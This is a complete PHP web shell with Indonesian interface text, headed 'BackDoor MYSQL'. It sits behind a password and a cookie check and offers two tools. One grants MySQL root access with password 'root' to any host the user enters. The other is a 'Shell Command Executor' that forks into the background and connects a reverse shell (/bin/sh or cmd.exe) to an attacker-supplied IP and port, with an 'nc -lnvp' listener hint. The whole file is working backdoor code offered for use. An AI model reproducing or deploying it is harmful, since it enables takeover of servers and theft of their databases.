<?php
$GLOBALS['pass'] = "63982e54a7aeb0d89910475ba6dbd3ca6dd4e5a1";

if (!function_exists('auth')) {
    function auth() {
        if (isset($GLOBALS['pass']) && (trim($GLOBALS['pass']) != '')) {
            $c = $_COOKIE;
            $p = $_POST;
            if (isset($p['pass'])) {
                $your_pass = sha1(md5($p['pass']));
                if ($your_pass == $GLOBALS['pass']) {
                    setcookie("pass", $your_pass, time() + 36000, "/");
                    header("Location: " . $_SERVER['PHP_SELF']);
                    exit();
                }
            }

            if (!isset($c['pass']) || ((isset($c['pass']) && ($c['pass'] != $GLOBALS['pass'])))) {
                echo "<!doctype html>
                <html>
                <head>
                    <meta charset='utf-8'>
                    <meta name='robots' content='noindex, nofollow, noarchive'>
                    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
                    <style>
                        body { background: #f8f8f8; color: #000000; padding: 0; margin: 0; }
                        form { display: flex; justify-content: center; align-items: center; height: 100vh; }
                        input[type='password'] { font-size: 20px; width: 300px; padding: 10px; border: 1px solid #cccccc; border-radius: 8px; color: #000000; text-align: center; }
                    </style>
                </head>
                <body>
                    <form method='post'>
                        <input type='password' name='pass' placeholder='Enter password' autofocus>
                    </form>
                </body>
                </html>";
                die();
            }
        }
    }
}

auth();
?>
<!doctype html>
<html>
<head>
    <title>Halaman Aman</title>
    <meta charset='utf-8'>
    <meta name='robots' content='noindex, nofollow, noarchive'>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { background: #f0f0f0; color: #222222; font-family: 'Arial', sans-serif; }
        h1 { background: #E7E7E7; padding: 10px; border-radius: 8px; text-align: center; }
        .container { padding: 20px; }
        form { display: flex; flex-direction: column; align-items: center; margin-top: 20px; }
        label { margin-bottom: 10px; font-weight: bold; }
        input[type="text"], input[type="number"] { font-size: 16px; width: 300px; padding: 10px; border: 1px solid #cccccc; border-radius: 4px; }
        button { margin-top: 10px; padding: 10px 20px; font-size: 16px; border: none; border-radius: 4px; background-color: #4CAF50; color: white; cursor: pointer; }
        button:hover { background-color: #45a049; }
        .success-message { color: green; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>
<div class="container">
    <h1>BackDoor MYSQL</h1>
    <form method="POST">
        <label for="allowed_host">Masukkan IP Host yang Akan Diizinkan:</label>
        <input type="text" name="allowed_host" id="allowed_host" required>
        <button type="submit">Submit</button>
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $server = "localhost";
        $username = "root";
        $password = "";

        // Check if allowed_host is set and not empty
        if (isset($_POST['allowed_host']) && !empty(trim($_POST['allowed_host']))) {
            $allowed_host = trim($_POST['allowed_host']);

            try {
                $pdo = new PDO("mysql:host=$server", $username, $password);
                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

                $query = "GRANT ALL PRIVILEGES ON *.* TO 'root'@'$allowed_host' IDENTIFIED BY 'root' WITH GRANT OPTION;";
                $pdo->exec($query);
                $pdo->exec("FLUSH PRIVILEGES;");

                $local_ip = gethostbyname(gethostname());
                echo "<div class='success-message' style='text-align: center;'>Akses berhasil diberikan untuk host $allowed_host dengan username root & password root.</div>";
                echo "<div class='success-message' style='text-align: center;'>Anda dapat mengakses database menggunakan perintah: <code>mysql -h $local_ip -u root -p</code></div>";
            } catch (PDOException $e) {
                echo "Error: " . $e->getMessage();
            }
        } else {
            //echo "<div class='success-message' style='text-align: center;'></div>";
        }
    }
    ?>

    <h1>Shell Command Executor</h1>
    <form method="POST">
        <label for="addr">Alamat IP:</label>
        <input type="text" id="addr" name="addr" required>
        <br>
        <label for="port">Port:</label>
        <input type="number" id="port" name="port" required>
        <br>
        <input type="submit" value="Jalankan" style="margin-top: 10px; padding: 10px 20px; font-size: 16px; border: none; border-radius: 4px; background-color: #4CAF50; color: white; cursor: pointer;">
    </form>

    <pre>
    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['addr']) && isset($_POST['port'])) {
        class Shell {
            private $addr  = null;
            private $port  = null;
            private $os    = null;
            private $shell = null;
            private $descriptorspec = array(
                0 => array('pipe', 'r'),
                1 => array('pipe', 'w'),
                2 => array('pipe', 'w')
            );
            private $buffer = 1024;
            private $clen   = 0;
            private $error  = false;
            private $sdump  = true;

            public function __construct($addr, $port) {
                $this->addr = $addr;
                $this->port = $port;
            }

            private function detect() {
                $detected = true;
                $os = PHP_OS;
                if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
                    $this->os    = 'LINUX';
                    $this->shell = '/bin/sh';
                } else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {
                    $this->os    = 'WINDOWS';
                    $this->shell = 'cmd.exe';
                } else {
                    $detected = false;
                    echo "<div class='error-message' style='color: red; font-weight: bold;'>Scrit ini tidak tersedia untuk system operasi ini</div>\n";
                }
                return $detected;
            }

            private function daemonize() {
                $exit = false;
                if (!function_exists('pcntl_fork')) {
                    //echo "<div class='success-message' style='text-align: center;'>Anda belum melakukan listening<br>nc -lnvp {$this->port}</div>\n";
                } else if (($pid = @pcntl_fork()) < 0) {
                    //echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
                } else if ($pid > 0) {
                    $exit = true;
                    //echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
                } else if (posix_setsid() < 0) {
                    //echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
                } else {
                    //echo "DAEMONIZE: Completed successfully!\n";
                }
                return $exit;
            }

            private function settings() {
                @error_reporting(0);
                @set_time_limit(0);
                @umask(0);
            }

            private function dump($data) {
                if ($this->sdump) {
                    $data = str_replace('<', '&lt;', $data);
                    $data = str_replace('>', '&gt;', $data);
                    //echo $data;
                }
            }

            private function read($stream, $name, $buffer) {
                if (($data = @fread($stream, $buffer)) === false) {
                    $this->error = true;
                    //echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
                }
                return $data;
            }

            private function write($stream, $name, $data) {
                if (($bytes = @fwrite($stream, $data)) === false) {
                    $this->error = true;
                    //echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
                }
                return $bytes;
            }

            private function rw($input, $output, $iname, $oname) {
                while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
                    if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); }
                    $this->dump($data);
                }
            }

            private function brw($input, $output, $iname, $oname) {
                $size = fstat($input)['size'];
                if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
                    while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                        $this->clen -= $bytes;
                        $size -= $bytes;
                    }
                }
                while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
                    $size -= $bytes;
                    $this->dump($data);
                }
            }

            public function run() {
                if ($this->detect() && !$this->daemonize()) {
                    $this->settings();
                    $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
                    if (!$socket) {
                        if ($errno == 10061) {
                            echo "<div class='success-message' style='text-align: center;'>Anda belum melakukan listening<br>nc -lnvp {$this->port}</div>\n";
                        } else if ($errno == 10060) {
                            echo "<div class='success-message' style='text-align: center;'>Gagal Terhubung<br>Periksa IP atau Port Anda</div>\n";
                        } else {
                            //echo "SOC_ERROR: {$errno}: {$errstr}\n";
                        }
                    } else {
                        stream_set_blocking($socket, false);
                        $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                        if (!$process) {
                            //echo "PROC_ERROR: Cannot start the shell\n";
                        } else {
                            foreach ($pipes as $pipe) {
                                stream_set_blocking($pipe, false);
                            }
                            $status = proc_get_status($process);
                            @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
                            echo "<div class='success-message' style='text-align: center;'>Berhasil terhubung dengan server menggunakan nc -lnvp {$this->port}</div>\n";
                            echo "<script>
                                    setTimeout(function() { window.location.reload(); }, 3000); // Reload the page after 3 seconds
                                  </script>";
                            do {
                                $status = proc_get_status($process);
                                if (feof($socket)) {
                                    //echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                                } else if (feof($pipes[1]) || !$status['running']) {
                                    //echo "PROC_ERROR: Shell process has been terminated\n"; break;
                                }
                                $streams = array(
                                    'read'   => array($socket, $pipes[1], $pipes[2]),
                                    'write'  => null,
                                    'except' => null
                                );
                                $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0);
                                if ($num_changed_streams === false) {
                                    //echo "STRM_ERROR: stream_select() failed\n"; break;
                                } else if ($num_changed_streams > 0) {
                                    if ($this->os === 'LINUX') {
                                        if (in_array($socket, $streams['read'])) { $this->rw($socket, $pipes[0], 'SOCKET', 'STDIN'); }
                                        if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket, 'STDERR', 'SOCKET'); }
                                        if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket, 'STDOUT', 'SOCKET'); }
                                    } else if ($this->os === 'WINDOWS') {
                                        if (in_array($socket, $streams['read'])) { $this->rw($socket, $pipes[0], 'SOCKET', 'STDIN'); }
                                        if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket, 'STDERR', 'SOCKET'); }
                                        if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket, 'STDOUT', 'SOCKET'); }
                                    }
                                }
                            } while (!$this->error);
                            foreach ($pipes as $pipe) {
                                fclose($pipe);
                            }
                            proc_close($process);
                        }
                        fclose($socket);
                    }
                }
            }
        }

        $ip = $_POST['addr'];
        $port = $_POST['port'];

        $sh = new Shell($ip, $port);
        $sh->run();
        unset($sh);
    }
    ?>
    </pre>
</div>
</body>
</html>
